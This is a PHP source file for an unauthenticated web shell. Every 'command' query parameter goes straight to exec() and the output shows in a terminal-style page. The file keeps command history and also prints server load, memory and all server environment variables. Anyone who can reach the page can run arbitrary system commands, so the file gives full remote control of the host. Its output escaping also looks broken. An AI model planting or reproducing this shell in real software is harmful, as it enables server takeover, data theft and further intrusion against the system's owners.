<?php

session_start();
if(!isset($_SESSION['histo']) || isset($_GET['clear'])) $_SESSION['histo'] = array();
if(!isset($_SESSION['commands']) || isset($_GET['clear'])) $_SESSION['commands'] = array();
if(!isset($_SESSION['pwd']) || isset($_GET['clear'])){
	exec('pwd', $pwd);
	$_SESSION['pwd'] = $pwd[0];
}



/*
 * COMMAND PROCESSOR
 */
$command = isset($_GET['command'])?$_GET['command']:'';
$result = array();
// EXEC COMMAND + PUSH COMMAND IN HISTO
if($command!='') {
	$cmds = $_SESSION['commands'];
	$_SESSION['commands'] = array();
	array_push($_SESSION['commands'], $command);
	foreach($cmds as $cmd){
		if(count($_SESSION['commands'])<5 && $cmd!=$_SESSION['commands'][0]){
			array_push($_SESSION['commands'], $cmd);
		}
	}
	// GET THE ACTIVE PATH
	if(isset($_SESSION['pwd'])){
		$path = $_SESSION['pwd'];
	} else {
		$pwd = array();
		exec('pwd', $pwd);
		$path = $pwd[0];
	}
	$_SESSION['pwd'] = $path;
	// EXEC THE REQUESTED COMMAND
	if(substr($command, 0, 1)=='$'){
		exec(substr($command, 1), $result);
	} else {
		exec('cd '.$path.' && '.$command.' 2>&1', $result);
	}
	// GET THE NEW ACTIVE PATH
	if(substr($command, 0, 3)=='cd '){
		$pwd = array();
		exec('cd '.$path.' && '.$command.' && pwd', $pwd);
		$_SESSION['pwd'] = $pwd[0];
	}
	// PUSH COMMAND INTO HISTO
	array_push($_SESSION['histo'], $_SERVER['SERVER_ADDR'].': '.$path.'$ '.$command);
}
// PUSH RESULTS INTO HISTO
foreach($result as $line){
	array_push($_SESSION['histo'], $line);
}
// CLEAR HISTO : on ne garde que les 200 derniÃ¨re lignes
while(count($_SESSION['histo'])>200){
	array_shift($_SESSION['histo']);
}

/*
 * IHM
 */
echo('<a href="?clear">CLEAR</a><br />');
echo('<div style="background:#000;color:#0f0;height:336px;line-height:14px;font-size:12px;font-family:andale mono,monospace;white-space:pre;overflow:scroll;" id="histo">');
foreach($_SESSION['histo'] as $line){
	echo(str_replace('<', '<', str_replace('>', '>', $line)).'<br />');
}
if(isset($_SESSION['pwd'])){
	echo($_SERVER['SERVER_ADDR'].': '.$_SESSION['pwd'].'$');
}
echo('</div>');
echo('<form method="get"><input style="width:410px;" id="command" name="command" value="" type="text" /><input type="submit" value="exec" /></form>');
foreach($_SESSION['commands'] as $cmd){
	echo('<a href="?command='.urlencode($cmd).'">'.str_replace('<', '<', str_replace('>', '>', $cmd)).'</a><br />');
}
echo('
<script type="text/javascript">
document.getElementById(\'command\').focus();
document.getElementById(\'histo\').scrollTop = '.max((count($_SESSION['histo']))*14, 0).';
</script>
');




$load = sys_getloadavg();
$nbCores = exec('grep \'model name\' /proc/cpuinfo | wc -l');
exec('cat /proc/meminfo', $mem);
preg_match('/ ([0123456789]+) kB/', $mem[0], $memTot);
preg_match('/ ([0123456789]+) kB/', $mem[1], $memFree);
echo('<br /><br />
load1min = '.$load[0].'<br />
load5min = '.$load[1].'<br />
load15min = '.$load[2].'<br />
nbCores = '.$nbCores.'<br />
memTotal = '.$memTot[1].'<br />
memFree = '.$memFree[1].'<br />
ip = '.$_SERVER['SERVER_ADDR'].'<br />
<br />');

foreach($_SERVER as $key => $val){
	echo($key.' => '.$val.'<br />');
}
